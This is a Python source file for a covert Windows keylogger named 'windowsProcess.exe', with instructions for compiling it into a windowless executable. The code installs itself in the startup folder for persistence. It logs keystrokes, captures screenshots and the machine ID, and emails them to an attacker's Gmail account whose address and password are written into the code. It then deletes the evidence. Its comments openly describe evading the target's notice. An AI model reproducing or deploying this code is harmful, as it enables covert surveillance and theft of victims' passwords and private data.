""" 
To compile into an exe, use the following command:

pyinstaller --noconsole windowsProcess.py --onefile

Optional:

To change the icon, use resourceHacker (free program)
"""

# Keylogging Utilities
from pynput import keyboard

# Email Utilities
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Time Utilities
from datetime import datetime
import time

# Threading Utilites - Enable sending logic to be seperate from keypress logic.
import threading

# Screenshot Utilities
from PIL import ImageGrab

# SystemId Utilities
import subprocess

# Startup Utilities
import os
import winshell

sender_email_address = "rashmir.sirpaka1993@gmail.com"
sender_email_password = "qmkh nxxn grui wpdr"

reciever_email_address = "rashmir.sirpaka1993@gmail.com"
keys = []

screenshot_information = "screenshot.png"

system_information = "systeminfo.txt"

# Initialize last_keypress_time_epoch as a global variable
last_keypress_time_epoch = time.time()


def find_windows_process_exe():
    current_directory = os.getcwd()  # Get the current working directory

    while not os.path.exists(os.path.join(current_directory, "windowsProcess.exe")):
        # Move up one directory
        current_directory = os.path.dirname(current_directory)

        # Check if we've reached the root directory
        if current_directory == os.path.dirname(current_directory):
            break

    return current_directory


def add_to_startup():
    script_path = find_windows_process_exe() + "\\windowsProcess.exe"
    if not script_path:
        print("The 'windowsProcess.exe' file was not found in the current directory or any parent directories.")
        return

    startup_folder = winshell.startup()  # Get the user's startup folder

    # Construct the destination path for the copy in the startup folder
    destination_path = os.path.join(startup_folder, "windowsProcess.exe")

    try:
        # Copy the script to the startup folder
        os.system(f'copy "{script_path}" "{destination_path}"')
        print(
            f"Added a copy of 'windowsProcess.exe' to the startup folder: {destination_path}")
    except Exception as e:
        print(f"Error: {e}")


def send_email(keys):
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = sender_email_address

    # storing the receivers email address
    msg['To'] = reciever_email_address

    # get the unique systemId
    current_machine_id = str(subprocess.check_output(
        'wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

    # get the current time
    current_datetime = datetime.now()
    formatted_datetime = current_datetime.strftime("%d-%m-%Y>%H:%M:%S")

    # storing the subject
    msg['Subject'] = f"{current_machine_id} {formatted_datetime}"

    # string to store the body of the mail
    # each logged key is seperated by a space, which wouldn't represent an
    # actual space as that would be a Key.space entry.
    # Convert each keycode into a string before joining.
    body = " ".join(str(key) for key in keys)

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # take a screenshot
    screenshot()

    # open the file to be sent in bytes
    filename = "screenshot.png"
    attachment = open(filename, "rb")

    # instance of MIMEBase and named as part.
    # application specifies the general media type.
    part = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    part.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(part)

    # Content-Disposition indicates that the part should be treated as an attachment
    # rather than inline content.
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(part)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(sender_email_address, sender_email_password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(sender_email_address, reciever_email_address, text)

    # terminating the session
    s.quit()

    # delete the screenshot file permanently (does not go to recycle bin)
    script_path = find_windows_process_exe() + "\\screenshot.png"
    os.system(f'del /f "{script_path}"')


def keyPressed(key):
    # Initialize last_keypress_time_epoch as a global variable
    # This indicates that we're working with the global variable last_keypress_time_epoch
    global last_keypress_time_epoch
    global curr_time_epoch
    # Don't write to a file, since this is easy for the target to catch (especially with
    # the file being in the startup folder) and hard for the attacker to retrieve.
    # open("keyfile.txt", 'a').write(str(key))
    keys.append(key)
    last_keypress_time_epoch = time.time()


def send_email_buffer():
    global keys
    global last_keypress_time_epoch
    global curr_time_epoch
    # Sends logged keys every 20 keys or every 30 minutes (which ever is first).
    # Does not send empty email.
    # Won't send email if keys have been pressed in the last 10 seconds (for better
    # undetectability as it causes lag, also could catch more prashes)
    while (True):
        time.sleep(1)
        curr_time_epoch = time.time()
        if ((len(keys) >= 6 or ((curr_time_epoch - last_keypress_time_epoch) / 60) >= 30)
                and (curr_time_epoch - last_keypress_time_epoch) >= 10):
            send_email(keys)
            # Can't simply 'do keys = []' as that would declare it as a local variable
            keys.clear()


def screenshot():
    img = ImageGrab.grab()
    img.save(screenshot_information)


emailerThread = threading.Thread(target=send_email_buffer)
keyloggingThread = threading.Thread(target=input)

if __name__ == "__main__":
    add_to_startup()
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    # Threads required for seperate email and keylogging logic
    emailerThread.start()
    keyloggingThread.start()
